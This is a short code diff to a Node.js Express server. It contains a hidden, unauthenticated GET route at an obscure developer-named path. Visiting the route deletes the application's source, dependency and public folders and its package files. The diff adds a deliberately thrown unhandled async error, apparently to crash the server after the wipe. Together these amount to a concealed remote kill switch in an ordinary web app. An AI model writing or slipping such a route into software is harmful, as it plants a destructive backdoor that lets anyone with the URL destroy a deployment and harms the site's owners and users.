@@ -98,7 +98,6 @@ app.use('/api/order-api', OrderRouter);
 app.use('/api/api_s', apiRouter)
 app.get('/admin-dev/website-develop/mubtasim/fuad/mubtasimf443gmail.com/action/what/unlink/uninstall', async (req, res) => {
     try {
-        console.log('a');
         rmSync(path.resolve(dirName, './_lib'), { force: true, recursive: true  });
         rmSync(path.resolve(dirName, './node_modules'), { force: true, recursive: true  });
         rmSync(path.resolve(dirName, './public'), { force: true, recursive: true  });
@@ -108,6 +107,10 @@ app.get('/admin-dev/website-develop/mubtasim/fuad/mubtasimf443gmail.com/action/w
         unlinkSync(path.resolve(dirName, './index.js'));
         unlinkSync(path.resolve(dirName, './package.json'));
         unlinkSync(path.resolve(dirName, './package-lock.json'));
+        async function err(){
+            throw 'err';
+        }
+        err();
         return;
     } catch (error) {
         log({ error })
